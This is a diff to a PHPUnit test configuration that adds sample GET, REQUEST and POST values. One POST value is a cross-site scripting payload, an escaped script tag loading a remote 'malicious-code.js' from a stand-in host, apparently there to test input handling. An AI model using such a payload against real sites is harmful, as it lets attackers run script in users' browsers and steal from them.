@@ -18,6 +18,10 @@
   </testsuites>
   <php>
     <env name="APP_ENV" value="test"/>
+    <get name="date" value="2013-11-09"/>
+    <get name="number" value="22" />
+    <request name="page" value="home"/>
+    <post name="action" value="x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e"/>
   </php>
   <logging>
     <junit outputFile="./tests/logs/tmp/logfile.xml"/>
